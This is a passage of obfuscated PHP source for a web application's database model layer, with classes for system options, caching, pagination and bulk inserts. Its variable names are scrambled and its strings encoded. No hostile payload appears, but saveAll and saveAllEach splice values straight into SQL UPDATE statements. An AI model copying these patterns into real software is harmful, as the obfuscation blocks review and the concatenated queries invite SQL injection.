array($œ±Ó´É [2463] => $™âÓ£Æ‰[$œ±Ó´É [486]], $œ±Ó´É [32] => $™âÓ£Æ‰[$œ±Ó´É [32]], $œ±Ó´É [207] => $™âÓ£Æ‰[$œ±Ó´É [207]], $œ±Ó´É [33] => isset($™âÓ£Æ‰[$œ±Ó´É [33]]) ? $™âÓ£Æ‰[$œ±Ó´É [33]] : 1, $œ±Ó´É [2464] => isset($™âÓ£Æ‰[$œ±Ó´É [2464]]) ? $™âÓ£Æ‰[$œ±Ó´É [2464]] : 0, $œ±Ó´É [815] => 0, $œ±Ó´É [229] => 0); return parent::insert($ßÕ‰á¨ª); } public function userNoticeEdit($·Â½½€Ü, $šæê‹¼·) { $this->initUserOption(); return parent::update($·Â½½€Ü, $šæê‹¼·); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\164\x65\155\137\x6f\x70\164\x69\157\x6e"; protected $jsonField = array("\155\145\x6e\x75", "\162\x6f\154\x65", "\x72\157\x6c\145\107\162\157\x75\160", "\162\x65\147\151\x73\164", "\145\155\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($¨È¬ó„) { return "\123\171\163\x74\145\155\x4f\x70\x74\151\x6f\156\x5f{$¨È¬ó„}"; } protected function optionDefault($”Èñ»úÜ = '') { $ş£–İèĞ =& $_SERVER[äô®•½Â]; if ($”Èñ»úÜ == $ş£–İèĞ[12]) { return $GLOBALS[$ş£–İèĞ[6]][$ş£–İèĞ[468]]; } } } class SystemRecordModel extends ModelBaseLight { } goto b†²‘¿×; F×î¤ùÈ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\151\146\x79\124\x69\155\x65", "\164\x69\x6d\145", "\151\x6e\163\145\x72\164\54\x75\160\144\141\164\x65", "\x66\165\x6e\x63\x74\x69\157\156"), array("\143\x72\x65\x61\164\145\x54\x69\x6d\145", "\x74\x69\x6d\x65", "\x69\156\x73\145\162\164", "\x66\x75\156\x63\164\x69\157\156")); public function setDataAuto($œÍöõ³”) { $this->dataAuto = $œÍöõ³”; } public function __construct($ Ã±ÄÜ¡ = '', $ÁÛ´¯²Ó = '', $åÃ–¾¬¾ = '') { parent::__construct($ Ã±ÄÜ¡, $ÁÛ´¯²Ó, $åÃ–¾¬¾); } protected $tableMeta = array(); protected function _beforeInsert(&$Î„ï¦ÜĞ, $½¢’ÀÚ) { $ÙğôÑëÆ =& $_SERVER[äô®•½Â]; if (!$this->checkDataAutoHas($ÙğôÑëÆ[441])) { return; } $this->dataBeforeFilter($Î„ï¦ÜĞ, $ÙğôÑëÆ[441]); } protected function _beforeUpdate(&$ÄÎÃäÓÅ, $«³È¹š») { $Øğİ­Ç =& $_SERVER[äô®•½Â]; if (!$this->checkDataAutoHas($Øğİ­Ç[442])) { return; } $this->dataBeforeFilter($ÄÎÃäÓÅ, $Øğİ­Ç[442]); } protected function _afterSelect(&$˜–Õ†¢É, $µ…çûíÄ) { if (!is_array($˜–Õ†¢É)) { return; } if (!$this->checkDataAutoHas($_SERVER[äô®•½Â][443])) { return; } foreach ($˜–Õ†¢É as &$ÕÍğø˜¤) { $this->dataAfterFilter($ÕÍğø˜¤); } unset($ÕÍğø˜¤); } protected function _afterFind(&$™ÌŒ¡ÆÔ, $ç¢ÀÆ¿) { if (!is_array($™ÌŒ¡ÆÔ)) { return; } if (!$this->checkDataAutoHas($_SERVER[äô®•½Â][443])) { return; } $this->dataAfterFilter($™ÌŒ¡ÆÔ); } public static function textEncode($‹©½•Šµ) { if (!$‹©½•Šµ) { return $‹©½•Šµ; } $‡îÈÛ = json_encode($‹©½•Šµ); $‡îÈÛ = preg_replace_callback($_SERVER[äô®•½Â][444], function ($¸ô¢àç£) { return addslashes($¸ô¢àç£[0]); }, $‡îÈÛ); return json_decode($‡îÈÛ); } public static function textDecode($ƒûé±ïÎ) { $õµè” =& $_SERVER[äô®•½Â]; $§Ä‚²‰™ = json_encode($ƒûé±ïÎ); $§Ä‚²‰™ = preg_replace_callback($õµè”[445], function ($¡ˆ„Ò°õ) { return $_SERVER[äô®•½Â][100]; }, $§Ä‚²‰™); return json_decode($§Ä‚²‰™); } public function setAutoIncrement($ÀÊ’ˆ¯¦) { $©‚¸å¿ó = array($this->getPk() => $ÀÊ’ˆ¯¦); $ñß¶ÌÏ = $this->data($©‚¸å¿ó)->add(); if ($ñß¶ÌÏ) { $this->delete($ñß¶ÌÏ); } } public function getAutoIncrement() { $š€…Å¶š = $this->getTableName(); $”ÓÛ’ê‚ = $this->max($this->getPk()); $¡—¯éå¨ = $this->query("\163\x68\157\x77\40\x74\141\142\154\x65\40\163\x74\x61\x74\x75\163\x20\x77\150\145\162\145\40\116\x61\x6d\x65\75\x27{$š€…Å¶š}\47"); $¢³„ƒ¾ = $¡—¯éå¨[0][$_SERVER[äô®•½Â][446]]; $Ö÷ë•´Ú = max($”ÓÛ’ê‚, $¢³„ƒ¾); return $Ö÷ë•´Ú; } protected function _callBefore($¶ûÏ¡êÑ, $£ˆ€¾¼¦) { return $this->cacheCallCheck($¶ûÏ¡êÑ, $£ˆ€¾¼¦, !1); } protected function _callAfter($©Ë‰Ó”, $¤ÉãòÍ) { return $this->cacheCallCheck($©Ë‰Ó”, $¤ÉãòÍ, !0); } protected function cacheFunctionAlias($­¨Ûö) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($´º±¤½», $ÚÂ¯¢²Ç, $½íÖáôÈ = false) { $Ş§¶ó =& $_SERVER[äô®•½Â]; $é¬¼°ÚÖ = $this->cacheFunctionAlias($ÚÂ¯¢²Ç); if (!$é¬¼°ÚÖ) { return; } foreach ($é¬¼°ÚÖ as $§õÍï— => $Ş´‘ÊÔ) { $÷˜âö’† = $Ş´‘ÊÔ[0]; $¯üï–Œé = explode($Ş§¶ó[50], $Ş´‘ÊÔ[1]); $ˆõÌé‡‚ = isset($Ş´‘ÊÔ[2]) ? $Ş´‘ÊÔ[2] : $Ş§¶ó[12]; if ($´º±¤½» == $§õÍï—) { return $this->cacheFunctionGet($§õÍï—, $÷˜âö’†, $ˆõÌé‡‚); } if ($½íÖáôÈ && in_array($´º±¤½», $¯üï–Œé)) { $this->cacheFunctionClear($§õÍï—, $÷˜âö’†, $ˆõÌé‡‚); } } } public function cacheFunctionGet($‡»øáÔ‰, $ŠâÃƒ”Ó, $¢ÒØÃá÷ = '') { $Ö“‹ßÂ = $this->cacheKeyMake($‡»øáÔ‰, $ŠâÃƒ”Ó, $¢ÒØÃá÷); $§ÀÎü×İ = Cache::get($Ö“‹ßÂ); if (!is_array($§ÀÎü×İ)) { $§ÀÎü×İ = call_user_func_array(array($this, $‡»øáÔ‰), array($ŠâÃƒ”Ó, !0)); Cache::set($Ö“‹ßÂ, $§ÀÎü×İ); } return $§ÀÎü×İ; } public function cacheFunctionClear($Õ¢ìÒàä, $ğõ„‹¯«, $Â¬††¤ø = '') { $šĞîâµò = $ğõ„‹¯«; if (!is_array($ğõ„‹¯«)) { $šĞîâµò = array($ğõ„‹¯«); } foreach ($šĞîâµò as $ìø›Ÿ˜) { $î’Ç†şØ = $this->cacheKeyMake($Õ¢ìÒàä, $ìø›Ÿ˜, $Â¬††¤ø); Cache::remove($î’Ç†şØ); } } public function cacheKeyMake($º¾È‰º…, $şøşØ†¡, $Åä§¾ùº) { $åÆºä£æ =& $_SERVER[äô®•½Â]; if ($Åä§¾ùº) { $şøşØ†¡ = $şøşØ†¡ . $åÆºä£æ[447] . $Åä§¾ùº; } return get_class($this) . $åÆºä£æ[11] . $º¾È‰º… . $åÆºä£æ[448] . $şøşØ†¡; } protected function selectPageReset() { $ŠÖôÙ‘ =& $_SERVER[äô®•½Â]; if (isset($GLOBALS[$ŠÖôÙ‘[449]])) { return; } $GLOBALS[$ŠÖôÙ‘[449]] = isset($GLOBALS[$ŠÖôÙ‘[7]][$ŠÖôÙ‘[450]]) ? $GLOBALS[$ŠÖôÙ‘[7]][$ŠÖôÙ‘[450]] : !1; $GLOBALS[$ŠÖôÙ‘[451]] = isset($GLOBALS[$ŠÖôÙ‘[7]][$ŠÖôÙ‘[439]]) ? $GLOBALS[$ŠÖôÙ‘[7]][$ŠÖôÙ‘[439]] : !1; $GLOBALS[$ŠÖôÙ‘[7]][$ŠÖôÙ‘[450]] = !1; $GLOBALS[$ŠÖôÙ‘[7]][$ŠÖôÙ‘[439]] = !1; } protected function selectPageRestore() { $³¦»ªÄÅ =& $_SERVER[äô®•½Â]; if (!isset($GLOBALS[$³¦»ªÄÅ[449]])) { return; } $GLOBALS[$³¦»ªÄÅ[7]][$³¦»ªÄÅ[450]] = $GLOBALS[$³¦»ªÄÅ[449]]; $GLOBALS[$³¦»ªÄÅ[7]][$³¦»ªÄÅ[439]] = $GLOBALS[$³¦»ªÄÅ[451]]; if ($GLOBALS[$³¦»ªÄÅ[7]][$³¦»ªÄÅ[450]] === !1) { unset($GLOBALS[$³¦»ªÄÅ[7]][$³¦»ªÄÅ[450]]); } if ($GLOBALS[$³¦»ªÄÅ[7]][$³¦»ªÄÅ[439]] === !1) { unset($GLOBALS[$³¦»ªÄÅ[7]][$³¦»ªÄÅ[439]]); } unset($GLOBALS[$³¦»ªÄÅ[449]]); unset($GLOBALS[$³¦»ªÄÅ[451]]); } protected function selectPage($á™ÃÌíš = 200, $Ğ³ÇĞ´ô = 1) { $‡Ó´¾‰ =& $_SERVER[äô®•½Â]; global $in; $ÉÂï˜š = $this->optionsValue(); $é­î©¦Š = 50000; $á™ÃÌíš = isset($in[$‡Ó´¾‰[450]]) && $in[$‡Ó´¾‰[450]] ? $in[$‡Ó´¾‰[450]] : $á™ÃÌíš; if ($á™ÃÌíš === -1) { $in[$‡Ó´¾‰[450]] = !1; $é­î©¦Š = 100000000; $á™ÃÌíš = $é­î©¦Š; } $ØıêîÒÒ = $ÉÂï˜š; $ØıêîÒÒ[$‡Ó´¾‰[452]] = array(); $á™ÃÌíš = intval($á™ÃÌíš); $á™ÃÌíš = $á™ÃÌíš <= 5 ? 5 : ($á™ÃÌíš >= $é­î©¦Š ? $é­î©¦Š : $á™ÃÌíš); $Ğ³ÇĞ´ô = intval(isset($in[$‡Ó´¾‰[439]]) && $in[$‡Ó´¾‰[439]] ? $in[$‡Ó´¾‰[439]] : $Ğ³ÇĞ´ô); $Ğ³ÇĞ´ô = $Ğ³ÇĞ´ô <= 1 ? 1 : $Ğ³ÇĞ´ô; $·Éß¹æä = array(); $€¥Áº•… = 1; if ($Ğ³ÇĞ´ô == 1 && $€¥Áº•…) { $this->optionsValue($ÉÂï˜š); $·Éß¹æä = $this->page($Ğ³ÇĞ´ô, $á™ÃÌíš)->select(); $”¡İãŒ = is_array($·Éß¹æä) ? count($·Éß¹æä) : 0; if ($”¡İãŒ < $á™ÃÌíš) { $öŠ›òÅ€ = 1; } else { $this->optionsValue($ØıêîÒÒ); $”¡İãŒ = intval($this->count()); $öŠ›òÅ€ = ceil($”¡İãŒ / $á™ÃÌíš); } } else { $this->optionsValue($ØıêîÒÒ); $”¡İãŒ = intval($this->count()); $öŠ›òÅ€ = ceil($”¡İãŒ / $á™ÃÌíš); $Ğ³ÇĞ´ô = $Ğ³ÇĞ´ô >= $öŠ›òÅ€ ? $öŠ›òÅ€ : $Ğ³ÇĞ´ô; $this->optionsValue($ÉÂï˜š); $·Éß¹æä = $this->page($Ğ³ÇĞ´ô, $á™ÃÌíš)->select(); } if (!is_array($·Éß¹æä)) { $·Éß¹æä = array(); } if ($öŠ›òÅ€ == 1) { $”¡İãŒ = count($·Éß¹æä); } $—èå‰Ó´ = array($‡Ó´¾‰[453] => array($‡Ó´¾‰[454] => $”¡İãŒ, $‡Ó´¾‰[450] => $á™ÃÌíš, $‡Ó´¾‰[439] => $Ğ³ÇĞ´ô, $‡Ó´¾‰[455] => $öŠ›òÅ€), $‡Ó´¾‰[456] => $·Éß¹æä); return $—èå‰Ó´; } protected function checkLength($ìŒ¾³ç, $¼ˆæ®–£ = 0, $Íù÷·ÁÙ = '') { $„áÑÜ¤Ş =& $_SERVER[äô®•½Â]; $¼ˆæ®–£ = $¼ˆæ®–£ ? $¼ˆæ®–£ : 65536; if (!$ìŒ¾³ç || strlen($ìŒ¾³ç) < $¼ˆæ®–£) { return; } $Íù÷·ÁÙ = $Íù÷·ÁÙ ? $Íù÷·ÁÙ . $„áÑÜ¤Ş[74] : $„áÑÜ¤Ş[12]; show_json($Íù÷·ÁÙ . LNG($„áÑÜ¤Ş[457]) . "\50{$¼ˆæ®–£}\x29", !1); } protected function metaSet($•üÜñÌÅ, $íÒÎ£³ƒ = null, $˜ÇøĞ‡ù = null) { $êöïò† =& $_SERVER[äô®•½Â]; if (!$this->tableMeta || !$•üÜñÌÅ) { return !1; } $°Ê©‰²æ = $this->tableMeta[$êöïò†[458]]; $–¤ÄŸïè = $this->tableMeta[$êöïò†[459]]; $Èûğ¬İÆ = Model($–¤ÄŸïè); $®ù¼ĞÖ = array($°Ê©‰²æ => $•üÜñÌÅ, $êöïò†[460] => $íÒÎ£³ƒ); if (is_null($íÒÎ£³ƒ)) { return $Èûğ¬İÆ->where(array($°Ê©‰²æ => $•üÜñÌÅ))->delete(); } if (is_null($˜ÇøĞ‡ù) && is_string($íÒÎ£³ƒ)) { return $Èûğ¬İÆ->where($®ù¼ĞÖ)->delete(); } $ş÷ãÕí = is_array($íÒÎ£³ƒ) ? $íÒÎ£³ƒ : array(); if (is_string($íÒÎ£³ƒ)) { $ş÷ãÕí[$íÒÎ£³ƒ] = $˜ÇøĞ‡ù; } $ÆÎÔêÇ¸ = array(); foreach ($ş÷ãÕí as $ò½¡ş”´ => $Ò¬¢À”™) { if (is_null($Ò¬¢À”™) && is_string($ò½¡ş”´)) { $Èûğ¬İÆ->where(array($°Ê©‰²æ => $•üÜñÌÅ, $êöïò†[460] => $ò½¡ş”´))->delete(); continue; } $this->checkLength($Ò¬¢À”™, !1, $–¤ÄŸïè . $êöïò†[4] . $ò½¡ş”´); $ÆÎÔêÇ¸[] = array($°Ê©‰²æ => $•üÜñÌÅ, $êöïò†[97] => $ò½¡ş”´, $êöïò†[461] => $Ò¬¢À”™); } $ğ¶Å™¥ë = $êöïò†[462] . $–¤ÄŸïè; CacheLock::lock($ğ¶Å™¥ë); $Èûğ¬İÆ->where(array($°Ê©‰²æ => $•üÜñÌÅ))->addAll($ÆÎÔêÇ¸, array(), !0); CacheLock::unlock($ğ¶Å™¥ë); return !0; } public function metaGet($×Ç¶Í, $Ì¦Ò¸’“ = false) { $¢ÒÌ É =& $_SERVER[äô®•½Â]; if (!$this->tableMeta) { return array(); } $¤ü„¡£Û = $this->tableMeta[$¢ÒÌ É[458]]; $²§†Íû× = Model($this->tableMeta[$¢ÒÌ É[459]]); if ($Ì¦Ò¸’“) { $¯–Öó¾› = array($¤ü„¡£Û => $×Ç¶Í, $¢ÒÌ É[97] => $Ì¦Ò¸’“); return $²§†Íû×->where($¯–Öó¾›)->getField($¢ÒÌ É[461]); } $¯–Öó¾› = array($¤ü„¡£Û => $×Ç¶Í); $±İüÄ’˜ = $²§†Íû×->field($¢ÒÌ É[463])->where($¯–Öó¾›)->select(); $±İüÄ’˜ = array_to_keyvalue($±İüÄ’˜, $¢ÒÌ É[97], $¢ÒÌ É[461]); return $±İüÄ’˜; } private function checkDataAutoHas($®ŠœñèÃ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Ÿšâ£¶ï) { if (in_array($®ŠœñèÃ, explode($_SERVER[äô®•½Â][50], $Ÿšâ£¶ï[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$¸†ğã¹, $¿‘¡•Á½) { $ˆ˜Îİá± =& $_SERVER[äô®•½Â]; if (!is_array($¸†ğã¹)) { return; } foreach ($this->dataAuto as $Í—†ç²) { $ã¿´îóõ = $Í—†ç²[0]; if (!in_array($¿‘¡•Á½, explode($ˆ˜Îİá±[50], $Í—†ç²[2]))) { continue; } switch (trim($Í—†ç²[3])) { case $ˆ˜Îİá±[407]: case $ˆ˜Îİá±[408]: $²ğÚ‚ÁÁ = $Í—†ç²[1]; $¬üÁÎÌè = isset($Í—†ç²[4]) ? (array) $Í—†ç²[4] : array(); if ($²ğÚ‚ÁÁ == $ˆ˜Îİá±[207] && array_key_exists($ã¿´îóõ, $¸†ğã¹)) { if (!$¸†ğã¹[$ã¿´îóõ]) { unset($¸†ğã¹[$ã¿´îóõ]); } break; } if (isset($¸†ğã¹[$ã¿´îóõ])) { array_unshift($¬üÁÎÌè, $¸†ğã¹[$ã¿´îóõ]); } if ($ˆ˜Îİá±[407] == $Í—†ç²[3]) { $¸†ğã¹[$ã¿´îóõ] = call_user_func_array($²ğÚ‚ÁÁ, $¬üÁÎÌè); } else { $¸†ğã¹[$ã¿´îóõ] = call_user_func_array(array(&$this, $²ğÚ‚ÁÁ), $¬üÁÎÌè); } break; case $ˆ˜Îİá±[359]: if (isset($¸†ğã¹[$ã¿´îóõ]) && $¸†ğã¹[$ã¿´îóõ]) { $¸†ğã¹[$ã¿´îóõ] = call_user_func_array(array(&$this, $Í—†ç²[1]), array($¸†ğã¹[$ã¿´îóõ])); } break; case $ˆ˜Îİá±[362]: $¸†ğã¹[$ã¿´îóõ] = $¸†ğã¹[$Í—†ç²[1]]; break; case $ˆ˜Îİá±[380]: if (isset($¸†ğã¹[$ã¿´îóõ]) && !is_string($¸†ğã¹[$ã¿´îóõ])) { $¸†ğã¹[$ã¿´îóõ] = json_encode_force($¸†ğã¹[$ã¿´îóõ]); } break; case $ˆ˜Îİá±[409]: if ($¸†ğã¹[$ã¿´îóõ] === $ˆ˜Îİá±[12]) { unset($¸†ğã¹[$ã¿´îóõ]); } break; case $ˆ˜Îİá±[410]: $¸†ğã¹[$ã¿´îóõ] = $Í—†ç²[1]; default: break; } } if ($¿‘¡•Á½ == $ˆ˜Îİá±[441]) { $šôä‰Ÿò = strtolower($this->db->getDbType()); if (strpos($šôä‰Ÿò, $ˆ˜Îİá±[13]) !== 0) { return; } $µñ­ÑÚ  = $this->field(!0)->fields; $ß©åğ¡Ú = $µñ­ÑÚ [$ˆ˜Îİá±[341]]; if (isset($µñ­ÑÚ [$ˆ˜Îİá±[340]])) { unset($ß©åğ¡Ú[$µñ­ÑÚ [$ˆ˜Îİá±[340]]]); } foreach ($ß©åğ¡Ú as $¨ÎÆıï” => $¿‘¡•Á½) { if (!isset($¸†ğã¹[$¨ÎÆıï”])) { $¸†ğã¹[$¨ÎÆıï”] = $ˆ˜Îİá±[12]; } } } } private function dataAfterFilter(&$Ø­ºÜ²) { $º£÷“ =& $_SERVER[äô®•½Â]; foreach ($this->dataAuto as $’¾áÍü¹) { $¦¦ÒÀ© = $’¾áÍü¹[0]; if (!isset($Ø­ºÜ²[$¦¦ÒÀ©])) { continue; } if (!in_array($º£÷“[443], explode($º£÷“[50], $’¾áÍü¹[2]))) { continue; } switch (trim($’¾áÍü¹[3])) { case $º£÷“[407]: case $º£÷“[408]: $ş¶ ²©‡ = isset($’¾áÍü¹[4]) ? (array) $’¾áÍü¹[4] : array(); array_unshift($ş¶ ²©‡, $Ø­ºÜ²[$¦¦ÒÀ©]); if (isset($’¾áÍü¹[4]) && $’¾áÍü¹[4] == $º£÷“[464]) { $ş¶ ²©‡ = array($Ø­ºÜ²[$¦¦ÒÀ©]); } if ($º£÷“[407] == $’¾áÍü¹[3]) { $Ø­ºÜ²[$¦¦ÒÀ©] = call_user_func_array($’¾áÍü¹[1], $ş¶ ²©‡); } else { $Ø­ºÜ²[$¦¦ÒÀ©] = call_user_func_array(array(&$this, $’¾áÍü¹[1]), $ş¶ ²©‡); } break; case $º£÷“[359]: if (isset($Ø­ºÜ²[$¦¦ÒÀ©]) && $Ø­ºÜ²[$¦¦ÒÀ©]) { $Ø­ºÜ²[$¦¦ÒÀ©] = call_user_func_array(array(&$this, $’¾áÍü¹[1]), array($Ø­ºÜ²[$¦¦ÒÀ©])); } break; case $º£÷“[362]: $Ø­ºÜ²[$¦¦ÒÀ©] = $Ø­ºÜ²[$’¾áÍü¹[1]]; break; case $º£÷“[380]: $ÒÁÈÊô‹ = $Ø­ºÜ²[$¦¦ÒÀ©]; $Ø­ºÜ²[$¦¦ÒÀ©] = json_decode($ÒÁÈÊô‹, !0); if (is_null($Ø­ºÜ²[$¦¦ÒÀ©])) { $Ø­ºÜ²[$¦¦ÒÀ©] = $ÒÁÈÊô‹; } break; case $º£÷“[409]: if ($Ø­ºÜ²[$¦¦ÒÀ©] === $º£÷“[12]) { unset($Ø­ºÜ²[$¦¦ÒÀ©]); } break; case $º£÷“[410]: $Ø­ºÜ²[$¦¦ÒÀ©] = $’¾áÍü¹[1]; break; default: break; } } } public function saveAll($´‡Å‹•) { $œøÑÑ„† =& $_SERVER[äô®•½Â]; $¯üÎ¦ñ = $this->tablePrefix . $this->tableName; $ÛÎ®³™ = self::SQL_WHERE_IN_CHUNK; $´‡Å‹• = is_array($´‡Å‹•) ? $´‡Å‹• : array(); $¡æ¥ğæ° = $œøÑÑ„†[465]; $Î†Ê¦åÅ = 0; $‡˜°­Öñ = array(); $‘¯ï×¿ì = count($´‡Å‹•); for ($óÑ¿áæ’ = 0; $óÑ¿áæ’ < $‘¯ï×¿ì; $óÑ¿áæ’++) { $÷¹ãƒûã = $´‡Å‹•[$óÑ¿áæ’]; if (!is_array($÷¹ãƒûã) || count($÷¹ãƒûã) != 4) { continue; } $­Õ¹‹Í = "\x55\x50\x44\x41\124\x45\x20\140{$¯üÎ¦ñ}\x60\40\x53\x45\x54\x20{$÷¹ãƒûã[2]}\x20\x3d\40\x43\x41\123\105\40{$÷¹ãƒûã[0]}\x20\xa"; if ($Î†Ê¦åÅ == 0) { $¡æ¥ğæ° = $­Õ¹‹Í; } $‡˜°­Öñ[] = $œøÑÑ„†[121] . $÷¹ãƒûã[1] . $œøÑÑ„†[121]; $Î†Ê¦åÅ++; $¡æ¥ğæ° .= "\x20\127\110\105\x4e\x20\47{$÷¹ãƒûã[1]}\47\x20\x54\x48\x45\116\x20\47{$÷¹ãƒûã[3]}\47\x20\12"; if ($Î†Ê¦åÅ == $ÛÎ®³™ || $óÑ¿áæ’ == $‘¯ï×¿ì - 1) { $Âƒì¨Ì¥ = implode($œøÑÑ„†[50], $‡˜°­Öñ); $¡æ¥ğæ° .= "\40\105\116\104\40\40\127\110\x45\x52\x45\x20{$÷¹ãƒûã[0]}\40\x49\116\x20\x28{$Âƒì¨Ì¥}\51\x20"; $this->execute($¡æ¥ğæ°); $Î†Ê¦åÅ = 0; $¡æ¥ğæ° = $­Õ¹‹Í; $this->chunkEventCheck(count($‡˜°­Öñ)); $‡˜°­Öñ = array(); } } $this->chunkEventSet(); } public function saveAllEach($ŸØ€—´Ï) { $÷ü½ãì¾ =& $_SERVER[äô®•½Â]; $™ê‰†Å = $this->tablePrefix . $this->tableName; foreach ($ŸØ€—´Ï as $‰ÌüÕ¯Ñ) { if (!is_array($‰ÌüÕ¯Ñ) || count($‰ÌüÕ¯Ñ) != 4) { continue; } $Ô²±‘Öë = $‰ÌüÕ¯Ñ[0] . $÷ü½ãì¾[466] . $‰ÌüÕ¯Ñ[1] . $÷ü½ãì¾[121]; $È¤Àğ—Ò = $‰ÌüÕ¯Ñ[2] . $÷ü½ãì¾[466] . $‰ÌüÕ¯Ñ[3] . $÷ü½ãì¾[121]; $š‘ˆ»ø® = "\165\160\x64\x61\164\x65\40{$™ê‰†Å}\40\x73\x65\x74\40{$È¤Àğ—Ò}\x20\x77\x68\x65\162\145\x20{$Ô²±‘Öë}\73"; $this->execute($š‘ˆ»ø®); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($É‘¦ÃÊŸ = false, $É¶æË¸è = false) { $this->_chunkEvent = $É‘¦ÃÊŸ; $this->_chunkEventParam = $É¶æË¸è; } private function chunkEventCheck($¯¸ù¾Ì¼) { if (!$this->_chunkEvent) { return; } $ªûï = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ªûï[$_SERVER[äô®•½Â][467]] = $¯¸ù¾Ì¼; Hook::trigger($this->_chunkEvent, $ªûï); } public function addAll($Ìš€áÇ, $÷ãòÔŸ† = array(), $àƒ‚ğ¢÷ = false) { $µ©Œ” =& $_SERVER[äô®•½Â]; ignore_timeout(); $§¿ŒÂ—æ = self::SQL_WHERE_IN_CHUNK; if (empty($Ìš€áÇ)) { $this->error = think_lang($µ©Œ”[360]); return !1; } $÷ãòÔŸ† = $this->_parseOptions($÷ãòÔŸ†); foreach ($Ìš€áÇ as $ÛæœÇŞ => $‹¼„¼Òƒ) { $Ìš€áÇ[$ÛæœÇŞ] = $this->_facade($‹¼„¼Òƒ); $this->_beforeInsert($Ìš€áÇ[$ÛæœÇŞ], $÷ãòÔŸ†); } if (method_exists($this->db, $µ©Œ”[361])) { for ($ÅŒ¹Ğß = 0; $ÅŒ¹Ğß < count($Ìš€áÇ); $ÅŒ¹Ğß += $§¿ŒÂ—æ) { $õ´÷Ö = array_slice($Ìš€áÇ, $ÅŒ¹Ğß, $§¿ŒÂ—æ); if (!is_array($õ´÷Ö) || count($õ´÷Ö) == 0) { break; } $çµ‘Ä§ = $this->db->insertAll($õ´÷Ö, $÷ãòÔŸ†, $àƒ‚ğ¢÷); $this->chunkEventCheck(count($õ´÷Ö)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Ìš€áÇ as $ÛæœÇŞ => $‹¼„¼Òƒ) { $çµ‘Ä§ = $this->db->insert($‹¼„¼Òƒ, $÷ãòÔŸ†, $àƒ‚ğ¢÷); } $this->commit(); } if (!1 !== $çµ‘Ä§) { $ÍÓ˜É ¿ = $this->getLastInsID(); if ($ÍÓ˜É ¿) { return $ÍÓ˜É ¿; } } return $çµ‘Ä§; } public function save($·äñ¡§ = '', $¹è¾Îš› = array()) { $¢É·ßú¡ =& $_SERVER[äô®•½Â]; $ÔÂĞÑ“ë = self::SQL_WHERE_IN_CHUNK; $¹±áÂË¥ = $this->optionsValue(); $ÎØ‡ÇØ» = $this->findWhereField($¹±áÂË¥); if (!$ÎØ‡ÇØ») { return parent::save($·äñ¡§, $¹è¾Îš›); } $Œ¸†Ş¨ö = 0; $¬ô¯—› = $¹±áÂË¥[$¢É·ßú¡[364]][$ÎØ‡ÇØ»][1]; $¬ô¯—› = is_array($¬ô¯—›) ? $¬ô¯—› : array(); $ŸªÚ²Ñ = count($¬ô¯—›); for ($ĞÂú¤ã½ = 0; $ĞÂú¤ã½ < $ŸªÚ²Ñ; $ĞÂú¤ã½ += $ÔÂĞÑ“ë) { $àúƒ¿ó = array_slice($¬ô¯—›, $ĞÂú¤ã½, $ÔÂĞÑ“ë); if (!is_array($àúƒ¿ó) || count($àúƒ¿ó) == 0) { break; } $¹±áÂË¥[$¢É·ßú¡[364]][$ÎØ‡ÇØ»][1] = $àúƒ¿ó; $this->optionsValue($¹±áÂË¥); $Œ¸†Ş¨ö += parent::save($·äñ¡§, $¹è¾Îš›); $this->chunkEventCheck(count($àúƒ¿ó)); } $this->chunkEventSet(); return $Œ¸†Ş¨ö; } public function add($üÖ¸Íµé = '', $ùÕ°Êç· = array(), $ô’àÀÑ” = false) { if ($this->addTaskStatus && is_array($üÖ¸Íµé)) { $this->addTaskData[] = $üÖ¸Íµé; return; } return parent::add($üÖ¸Íµé, $ùÕ°Êç·, $ô’àÀÑ”); } public function parseWhereLike($›º±íáú, $ÉµÊÌãŒ = '', $¶ÅşêÌ´ = false, &$¡®ÀáŞ = false) { $Û·À¨˜¨ =& $_SERVER[äô®•½Â]; $ö¼‰•÷„ = $GLOBALS[$Û·À¨˜¨[6]][$Û·À¨˜¨[468]]; if (!$ö¼‰•÷„[$Û·À¨˜¨[469]]) { return $›º±íáú; } if (!is_array($›º±íáú)) { return $›º±íáú; } $Ä£‰È¬ş = array(); $Î‘ôÑ = 0; foreach ($›º±íáú as $Ë³¿êä£ => $‰ïÆĞé) { if (is_array($‰ïÆĞé) && count($‰ïÆĞé) == 2 && $‰ïÆĞé[0] == $Û·À¨˜¨[470] && is_string($‰ïÆĞé[1]) && substr($‰ïÆĞé[1], 0, 1) == $Û·À¨˜¨[471] && substr($‰ïÆĞé[1], strlen($‰ïÆĞé[1]) - 1, 1) == $Û·À¨˜¨[471]) { $¡®ÀáŞ = !0; $™ğµ¼‹Ó = is_string($Ë³¿êä£) ? $Ë³¿êä£ : $ÉµÊÌãŒ; $ûÈÖ£»Ò = substr($‰ïÆĞé[1], 1, strlen($‰ïÆĞé[1]) - 2); $ûÈÖ£»Ò = $this->db->escapeString($ûÈÖ£»Ò); if (!strpos($™ğµ¼‹Ó, $Û·À¨˜¨[10])) { $™ğµ¼‹Ó = $Û·À¨˜¨[472] . $™ğµ¼‹Ó . $Û·À¨˜¨[472]; } $šà›Üõí = $Û·À¨˜¨[223] . $ûÈÖ£»Ò . $Û·À¨˜¨[223]; $ûÈÖ£»Ò = str_replace(array($Û·À¨˜¨[10], $Û·À¨˜¨[473], $Û·À¨˜¨[11]), $Û·À¨˜¨[474], $ûÈÖ£»Ò); if ($ö¼‰•÷„[$Û·À¨˜¨[475]]) { $šà›Üõí = $Û·À¨˜¨[476] . $ûÈÖ£»Ò . $Û·À¨˜¨[477]; if ($ö¼‰•÷„[$Û·À¨˜¨[478]]) { $šà›Üõí = $Û·À¨˜¨[477] . $ûÈÖ£»Ò . $Û·À¨˜¨[476]; } } $Ä£‰È¬ş[$Î‘ôÑ] = $Û·À¨˜¨[479] . $™ğµ¼‹Ó . $Û·À¨˜¨[480] . $šà›Üõí . $Û·À¨˜¨[481]; $Î‘ôÑ++; continue; } if (is_array($‰ïÆĞé)) { 